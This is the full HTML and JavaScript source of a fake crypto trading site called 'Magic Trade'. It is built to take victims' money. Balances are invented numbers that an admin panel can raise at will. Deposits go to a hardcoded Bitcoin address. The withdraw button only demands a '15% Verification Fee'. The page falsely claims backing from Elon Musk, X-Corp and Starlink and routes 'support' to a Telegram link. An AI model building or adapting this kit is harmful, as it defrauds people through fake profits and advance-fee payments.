<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Magic Trade | Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
    <style>
        /* Fixed the height and overflow issues for mobile */
        body { background: #010409; color: #e6edf3; font-family: -apple-system, sans-serif; margin: 0; padding: 0; height: 100dvh; display: flex; flex-direction: column; overflow: hidden; }
        .magic-card { background: #0d1117; border: 1px solid #30363d; border-radius: 12px; }
        .magic-gradient { background: linear-gradient(90deg, #1f6feb 0%, #388ed1 100%); }
        .bottom-nav { background: #0d1117; border-top: 1px solid #30363d; position: fixed; bottom: 0; width: 100%; display: flex; justify-content: space-around; padding: 15px 0; z-index: 100; }
        .nav-item { display: flex; flex-direction: column; align-items: center; font-size: 10px; color: #8b949e; cursor: pointer; }
        .nav-active { color: #58a6ff; }
        .market-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; padding-bottom: 40px; }
        .market-tile { background: #0d1117; border: 1px solid #30363d; padding: 15px; border-radius: 12px; transition: 0.2s; }
        .market-tile:active { background: #161b22; border-color: #58a6ff; }
        /* This is the key scroll fix */
        #scroll-container { flex: 1; overflow-y: auto; -webkit-overflow-scrolling: touch; }
    </style>
</head>
<body>

    <div id="auth-screen" class="fixed inset-0 z-[200] flex flex-col items-center justify-center bg-[#010409] p-6 text-center">
        <h1 class="text-4xl font-black mb-1 text-white italic">MAGIC<span class="text-blue-500">TRADE</span></h1>
        <p class="text-[9px] text-slate-500 tracking-[0.4em] mb-12 uppercase">Secured by X Holdings</p>
        <div class="magic-card p-6 w-full max-w-sm space-y-4">
            <input type="email" id="email" placeholder="Terminal ID" class="w-full p-4 rounded-xl bg-black border border-slate-800 text-sm outline-none">
            <input type="password" id="pass" placeholder="Password" class="w-full p-4 rounded-xl bg-black border border-slate-800 text-sm outline-none">
            <button onclick="handleAuth()" class="w-full magic-gradient p-4 rounded-xl font-bold uppercase text-xs active:scale-95">Access Terminal</button>
        </div>
    </div>

    <div id="app" class="hidden flex flex-col h-full overflow-hidden">
        
        <header class="p-4 flex justify-between items-center bg-[#0d1117] border-b border-slate-800 z-50">
            <div class="flex items-center gap-3">
                <div class="w-9 h-9 bg-blue-600 rounded-full flex items-center justify-center font-bold text-sm">M</div>
                <div><span id="user-display" class="font-bold text-sm block text-white leading-none">---</span><span class="text-[9px] text-green-500 font-bold uppercase">‚óè Node Live</span></div>
            </div>
            <button onclick="showSection('admin')" id="admin-icon" class="hidden text-lg">‚öôÔ∏è</button>
        </header>

        <div id="scroll-container">
            <main class="p-4 pb-24">
                
                <section id="home-sec" class="space-y-6">
                    <div class="magic-card p-6 bg-gradient-to-br from-[#161b22] to-[#010409]">
                        <p class="text-slate-500 text-[10px] font-bold uppercase tracking-widest mb-1">Portfolio Equity</p>
                        <h2 class="text-4xl font-mono font-bold text-white tracking-tighter">$ <span id="balance">0.00</span></h2>
                        <div class="grid grid-cols-2 gap-3 mt-6">
                            <button onclick="showSection('deposit')" class="bg-green-600 py-3 rounded-xl font-bold text-xs uppercase">Deposit</button>
                            <button onclick="showSection('withdraw')" class="bg-slate-800 py-3 rounded-xl font-bold text-xs uppercase">Withdraw</button>
                        </div>
                    </div>

                    <div class="magic-card overflow-hidden h-[320px]">
                        <div class="p-2 bg-black/60 border-b border-white/5"><span id="chart-title" class="text-[10px] font-bold text-blue-400 uppercase italic px-2">BTC/USDT Real-Time</span></div>
                        <iframe id="main-chart" src="https://s.tradingview.com/widgetembed/?symbol=BTCUSD&interval=1&theme=dark&style=1" class="w-full h-full border-none"></iframe>
                    </div>

                    <div>
                        <h4 class="text-[11px] font-black uppercase text-slate-500 tracking-[0.2em] mb-4">Market Watch</h4>
                        <div class="market-grid" id="market-tiles"></div>
                    </div>
                </section>

                <section id="settings-sec" class="hidden space-y-4">
                    <h3 class="text-xl font-bold">Terminal Info</h3>
                    <div class="magic-card p-5 space-y-4">
                        <div class="flex justify-between py-2 border-b border-slate-800"><span class="text-sm">Infrastructure</span><span class="text-blue-400 text-xs font-black">ELON MUSK / X-CORP</span></div>
                        <p class="text-[10px] text-slate-500 italic">"Magic Trade uses Starlink satellite nodes for retail asset management."</p>
                    </div>
                    <button onclick="logout()" class="w-full p-4 text-red-500 font-bold bg-red-500/10 rounded-xl mt-4">Log Out</button>
                </section>

                <section id="deposit-sec" class="hidden text-center py-10">
                    <div id="qrcode" class="bg-white p-2 inline-block rounded-xl mb-4"></div>
                    <p class="text-xs font-mono text-blue-400">bc1qnv6sshvdz0h2yjc0hxutkfn72qpqvshgjrw6zm</p>
                </section>

                <section id="withdraw-sec" class="hidden py-6 text-center space-y-4">
                    <h3 class="text-xl font-bold">Withdraw Portal</h3>
                    <button onclick="alert('ERROR: 15% Verification Fee required.')" class="w-full magic-gradient p-4 rounded-xl font-bold">Process Payout</button>
                </section>

                <section id="admin-sec" class="hidden space-y-4">
                    <div class="magic-card p-6 border-blue-500/50">
                        <input type="email" id="adm-target" placeholder="User Email" class="w-full p-4 rounded-xl bg-black border border-slate-800 mb-3">
                        <input type="number" id="adm-amt" placeholder="Amount" class="w-full p-4 rounded-xl bg-black border border-slate-800 mb-4">
                        <button onclick="adminInject()" class="w-full magic-gradient p-4 rounded-xl font-bold">INJECT CAPITAL</button>
                    </div>
                </section>

            </main>
        </div>

        <nav class="bottom-nav">
            <div onclick="showSection('home')" class="nav-item nav-active"><span>üìä</span><span>Markets</span></div>
            <div onclick="window.open('https://t.me/+12156208677')" class="nav-item"><span>üí¨</span><span>Support</span></div>
            <div onclick="showSection('settings')" class="nav-item"><span>‚öôÔ∏è</span><span>Settings</span></div>
        </nav>
    </div>

    <script>
        const assetList = [
            { name: "BTC/USDT", sym: "BTCUSD", chg: "+2.4%" },
            { name: "ETH/USDT", sym: "ETHUSD", chg: "+1.1%" },
            { name: "SOL/USDT", sym: "SOLUSD", chg: "+5.9%" },
            { name: "XAU/USD", sym: "XAUUSD", chg: "-0.2%" },
            { name: "TSLA/USD", sym: "TSLA", chg: "+3.1%" },
            { name: "AAPL/USD", sym: "AAPL", chg: "-1.0%" },
            { name: "DOGE/USD", sym: "DOGEUSD", chg: "+12.4%" },
            { name: "NVDA/USD", sym: "NVDA", chg: "+4.2%" }
        ];

        let users = JSON.parse(localStorage.getItem('magic_users')) || { "admin@magic.com": { name: "Root Admin", pass: "boss123", bal: 0, isAdmin: true } };
        let activeSession = localStorage.getItem('magic_session') || null;

        window.onload = () => {
            renderGrids();
            if(activeSession && users[activeSession]) enterApp(activeSession);
            new QRCode(document.getElementById("qrcode"), { text: "bc1qnv6sshvdz0h2yjc0hxutkfn72qpqvshgjrw6zm", width: 150, height: 150 });
        };

        function renderGrids() {
            const grid = document.getElementById('market-tiles');
            grid.innerHTML = assetList.map(a => `
                <div class="market-tile" onclick="switchAsset('${a.sym}', '${a.name}')">
                    <p class="text-[10px] font-black text-white italic">${a.name}</p>
                    <p class="text-xs font-mono font-bold ${a.chg.includes('+') ? 'text-green-500' : 'text-red-500'}">${a.chg}</p>
                </div>
            `).join('');
        }

        function switchAsset(symbol, label) {
            document.getElementById('main-chart').src = `https://s.tradingview.com/widgetembed/?symbol=${symbol}&interval=1&theme=dark&style=1`;
            document.getElementById('chart-title').innerText = `${label} Real-Time`;
            showSection('home');
            document.getElementById('scroll-container').scrollTo({top: 0, behavior: 'smooth'});
        }

        function handleAuth() {
            const e = document.getElementById('email').value.toLowerCase();
            const p = document.getElementById('pass').value;
            if(users[e] && users[e].pass === p) enterApp(e); else alert("ACCESS DENIED");
        }

        function enterApp(e) {
            activeSession = e; localStorage.setItem('magic_session', e);
            document.getElementById('auth-screen').classList.add('hidden');
            document.getElementById('app').classList.remove('hidden');
            document.getElementById('user-display').innerText = users[e].name;
            if(users[e].isAdmin) document.getElementById('admin-icon').classList.remove('hidden');
            updateUI();
        }

        function showSection(sec) {
            ['home-sec', 'settings-sec', 'deposit-sec', 'withdraw-sec', 'admin-sec'].forEach(s => document.getElementById(s).classList.add('hidden'));
            document.getElementById(sec + '-sec').classList.remove('hidden');
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('nav-active'));
        }

        function adminInject() {
            const t = document.getElementById('adm-target').value.toLowerCase();
            const a = parseFloat(document.getElementById('adm-amt').value);
            if(users[t]) { users[t].bal += a; localStorage.setItem('magic_users', JSON.stringify(users)); updateUI(); alert("DONE"); }
        }

        function updateUI() { document.getElementById('balance').innerText = users[activeSession].bal.toLocaleString(undefined, {minimumFractionDigits: 2}); }
        function logout() { localStorage.removeItem('magic_session'); location.reload(); }
    </script>
</body>
</html>
